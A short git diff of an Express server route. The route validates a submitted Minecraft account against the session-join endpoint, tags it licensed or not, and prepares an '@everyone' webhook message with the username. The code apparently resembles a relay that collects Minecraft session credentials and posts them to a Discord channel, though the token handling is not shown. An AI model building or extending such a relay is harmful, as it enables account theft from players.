@@ -23,25 +23,20 @@ app.post("/", async (req, res) => {
     })
     .then(res => {
         if (res.status === 204) {
-            console.log("License verified successfully, but no content returned.");
             return "License";
-        } else if (res.data && res.data.path === "/session/minecraft/join") {
-            console.log("Non-License detected by response content.");
+        } else if (res.status === 403) {
             return "Non-License";
         } else {
             console.log(`Unexpected status: ${res.status}`);
             return `Unexpected status: ${res.status}`;
         }
     }).catch(error => {
-        console.error(`Request failed with error: ${error.message}`);
         if (error.response) {
             console.error(`Response data: ${JSON.stringify(error.response.data)}`);
         }
         return "Request failed";
     });
-
-    console.log("License response:", response);
-
+    
     let webhookData = {
         content: `@everyone - ${req.body.username}`,
         embeds: [{
